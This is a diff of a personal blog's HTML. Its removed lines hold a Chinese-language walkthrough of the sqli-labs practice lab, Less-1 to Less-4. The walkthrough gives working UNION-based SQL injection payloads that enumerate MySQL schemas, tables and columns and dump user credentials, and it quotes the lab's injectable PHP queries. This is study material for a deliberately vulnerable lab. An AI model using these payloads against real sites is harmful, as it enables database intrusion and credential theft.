-<p>注：MySQL在5.xx版本以上有个information_schema数据库，该数据库记录了当前数据库的所有数据库、表、列、用户权限等信息，其中SCHEMATA 表存储MySQL所有数据库的基本信息，包括数据库名、编码类型路径等，show databases;结果取自此表；TABLE表存储MySQL中的表信息，show tables from schemaname;的结果取自此表；COLUMNS表：提供了表的列信息，show columns from schemaname.tablename;的结果取自此表</p>
-<p>可得到该数据库基本信息 版本：5.5.53 用户：root@localhost 当前数据库名： security</p>
-<h3 id="获取数据库中的信息（database，table，column）"><a href="#获取数据库中的信息（database，table，column）" class="headerlink" title="获取数据库中的信息（database，table，column）"></a>获取数据库中的信息（database，table，column）</h3><h4 id="获取数据库"><a href="#获取数据库" class="headerlink" title="获取数据库"></a>获取数据库</h4><pre><code>sqli-labs/Less-1/?id=-1&apos; union all select 1,2, schema_name,4,5 from information_schema.schemata %23
-</code></pre><p>返回了数据库 information_schema,一般MySQL中不止一个数据库，可以在加个<strong>limit 1,1</strong>第一个1表示从那里开始，第二个1表示几个，可以通过不断更改第一个数来显示数据库</p>
-<pre><code>sqli-labs/Less-1/?id=-1&apos; union all select 1,2, schema_name,4,5 from information_schema.schemata limit 2,1%23
-</code></pre><p>当然更简单的方法是使用<strong>group_concat()</strong>一次性返回所有的</p>
-<pre><code>sqli-labs/Less-1/?id=-1&apos; union all select 1,2, group_concat(schema_name),4,5 from information_schema.schemata %23
-</code></pre><p>返回：information_schema,challenges,mysql,performance_schema,security,test<br>security为需要查找的数据库</p>
-<h4 id="获取表"><a href="#获取表" class="headerlink" title="获取表"></a>获取表</h4><pre><code>sqli-labs/Less-1/?id=-1&apos; union all select 1,2, group_concat(table_name),4,5 from information_schema.tables where table_schema=&apos;security&apos; %23
-</code></pre><p>或者</p>
-<pre><code>sqli-labs/Less-1/?id=-1&apos; union all select 1,2, group_concat(table_name),4,5 from information_schema.tables where table_schema=0x7365637572697479 %23
-</code></pre><p>返回：emails,referers,uagents,users</p>
-<p>注意：security是字符串要使用<strong>单引号</strong>包裹，或者将其转为<strong>十六进制</strong>，<strong>数值类型</strong>不需要单引号（有时可能会过滤掉单引号）</p>
-<h4 id="获取列"><a href="#获取列" class="headerlink" title="获取列"></a>获取列</h4><pre><code>sqli-labs/Less-1/?id=-1&apos; union all select 1,2, group_concat(column_name),4,5 from information_schema.columns where table_name=&apos;users&apos; %23
-</code></pre><p>返回：id,username,password,first_name,last_name</p>
-<h4 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h4><p>到这里我们已经知道了数据库名security,表名users,列名id,username,password,first_name,last_name</p>
-<pre><code>sqli-labs/Less-1/?id=-1&apos; union all select 1, group_concat(username),group_concat(password),4,5 from security.users %23
-</code></pre><p>返回    </p>
-<pre><code>Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4
-
-Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4
-</code></pre><h2 id="Less-2-GET-Error-based-Intiger-based"><a href="#Less-2-GET-Error-based-Intiger-based" class="headerlink" title="Less-2 GET-Error based-Intiger based"></a>Less-2 GET-Error based-Intiger based</h2><p>基于get请求方法的整形注入<br>根据页面提示可知为<strong>数字型</strong>参数 <strong>id</strong></p>
-<pre><code>sqli-labs/Less-2/?id=1
-</code></pre><p>页面返回</p>
-<pre><code>Welcome    Dhakkan
-Your Login name:Dumb
-Your Password:Dumb 
-</code></pre><p>添加一个单引号后</p>
-<pre><code>sqli-labs/Less-2/?id=1&apos;
-</code></pre><p>页面返回错误</p>
-<pre><code>Welcome    Dhakkan
-You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos; LIMIT 0,1&apos; at line 1
-</code></pre><p>从外层逐层去掉闭合单引号发现只剩下一个单引号 ，可以判断为<strong>数字型sql注入</strong>。</p>
-<h3 id="构造payload-1"><a href="#构造payload-1" class="headerlink" title="构造payload"></a>构造payload</h3><pre><code>Less-2/?id=1 %23
-</code></pre><p>数字型直接把后面的注释掉即可</p>
-<pre><code>sqli-labs/Less-2/?id=1 order by 6 %23 报错
-sqli-labs/Less-2/?id=1 order by 5 %23 正常
-sqli-labs/Less-2/?id=-1 union select 1,2,3,4,5 %23 显示位 2，3
-sqli-labs/Less-2/?id=-1 union select 1,version(),database(),4,5 %23 版本：5.5.53 数据库：security
-sqli-labs/Less-2/?id=-1 union select 1,2, group_concat(schema_name),4,5 from information_schema.schemata %23 返回所有的数据库
-sqli-labs/Less-2/?id=-1 union  select 1,2, group_concat(table_name),4,5 from information_schema.tables where table_schema=&apos;security&apos; %23 返回security数据库的所有表名
-sqli-labs/Less-2/?id=-1 union all select 1,2, group_concat(column_name),4,5 from information_schema.columns where table_name=&apos;users&apos; %23 返回users表的所有列名
-sqli-labs/Less-2/?id=-1 union all select 1, group_concat(username),group_concat(password),4,5 from security.users %23 返回users表中的username和password字段的值
-</code></pre><p>以上payload与Less-1相似</p>
-<h3 id="字符型注入和数字型注入的区别"><a href="#字符型注入和数字型注入的区别" class="headerlink" title="字符型注入和数字型注入的区别"></a>字符型注入和数字型注入的区别</h3><p>Less-1 字符型 <strong>id=’$id’</strong></p>
-<pre><code>$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;
-</code></pre><p>Less-2 数字型 <strong>id=$id</strong></p>
-<pre><code>$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;
-</code></pre><p>加了一个单引号的报错结果</p>
-<pre><code>字符型：&apos;&apos;1&apos;&apos; LIMIT 0,1&apos; 从外逐层去掉成对的单引号 1&apos;
-数字型：&apos;&apos; LIMIT 0,1&apos;  从外逐层去掉成对的单引号 &apos;  
-</code></pre><p>如果没有报错显示：test1不报错,test2报错为字符型</p>
-<pre><code>test1  sqli-labs/Less-1/?id=1&apos; or &apos;1&apos;=&apos;2 
-test2  sqli-labs/Less-1/?id=1&apos; or &apos;1&apos;=2
-</code></pre><p>对比可知：字符型使用单号包裹，数字型无；加了一个单引号后可以看到提交的参数被单引号包裹；以及上面测试的结果判断。</p>
-<h2 id="Less-3-GET-Error-Single-quotes-with-twist-string"><a href="#Less-3-GET-Error-Single-quotes-with-twist-string" class="headerlink" title="Less-3 GET-Error-Single quotes with twist-string"></a>Less-3 GET-Error-Single quotes with twist-string</h2><h3 id="基于get请求方法的带括号的单引号字符型报错注入"><a href="#基于get请求方法的带括号的单引号字符型报错注入" class="headerlink" title="基于get请求方法的带括号的单引号字符型报错注入"></a>基于get请求方法的带括号的单引号字符型报错注入</h3><h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><pre><code>sqli-labs/Less-3/?id=1&apos;
-</code></pre><p>返回</p>
-<pre><code>near &apos;&apos;1&apos;&apos;) LIMIT 0,1&apos; at line 1
-</code></pre><p>分析发现是在 Less-1的基础上加了括号 </p>
-<h4 id="构造payload-2"><a href="#构造payload-2" class="headerlink" title="构造payload"></a>构造payload</h4><pre><code>sqli-labs/Less-3/?id=1&apos;) %23
-</code></pre><p>返回正常,这里看一下源码就更好理解了</p>
-<pre><code>$sql=&quot;SELECT * FROM users WHERE id=(&apos;$id&apos;) LIMIT 0,1&quot;;
-</code></pre><h4 id="按照之前的思路测试即可"><a href="#按照之前的思路测试即可" class="headerlink" title="按照之前的思路测试即可"></a>按照之前的思路测试即可</h4><pre><code>sqli-labs/Less-3/?id=1&apos;) order by 6 %23 返回错误
-sqli-labs/Less-3/?id=1&apos;) order by 5 %23 返回正常
-sqli-labs/Less-3/?id=-1&apos;) union all select 1,2,3,4,5 %23 可知 2，3回显
-</code></pre><h2 id="Less-4-Get-Error-based-Double-Quotes-string"><a href="#Less-4-Get-Error-based-Double-Quotes-string" class="headerlink" title="Less-4 Get-Error based- Double Quotes-string"></a>Less-4 Get-Error based- Double Quotes-string</h2><h3 id="基于get请求方法的双引号报错注入"><a href="#基于get请求方法的双引号报错注入" class="headerlink" title="基于get请求方法的双引号报错注入"></a>基于get请求方法的双引号报错注入</h3><h3 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h3><pre><code>sqli-labs/Less-4/?id=1&apos;
-</code></pre><p>页面正常没有任何异常（这里加了单引号没作用），加一个双引号</p>
-<pre><code>sqli-labs/Less-4/?id=1&quot;
-返回 near &apos;&quot;1&quot;&quot;) LIMIT 0,1&apos; at line 1
-</code></pre><p>从外逐层去掉成对的双引号和单引号 ，我们发现情况与Less-3类似，只是单引号换成双引号。</p>
-<h3 id="构造payload-3"><a href="#构造payload-3" class="headerlink" title="构造payload"></a>构造payload</h3><pre><code>sqli-labs/Less-4/?id=1&quot;) %23
-</code></pre><p>返回正常</p>
-<h3 id="按照之前的思路即可"><a href="#按照之前的思路即可" class="headerlink" title="按照之前的思路即可"></a>按照之前的思路即可</h3><pre><code>sqli-labs/Less-4/?id=1&quot;) order by 6%23
-sqli-labs/Less-4/?id=1&quot;) order by 5%23
-sqli-labs/Less-4/?id=-1&quot;) union select 1,2,3,4,5%23
-</code></pre>
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
+  <nav class="pagination">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
+  </nav>
+
 
 
           </div>
@@ -4216,7 +4319,7 @@ sqli-labs/Less-4/?id=-1&quot;) union select 1,2,3,4,5%23
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-count">11</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -4229,7 +4332,7 @@ sqli-labs/Less-4/?id=-1&quot;) union select 1,2,3,4,5%23
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-count">10</span>
                   <span class="site-state-item-name">tags</span>
                 </a>
               </div>
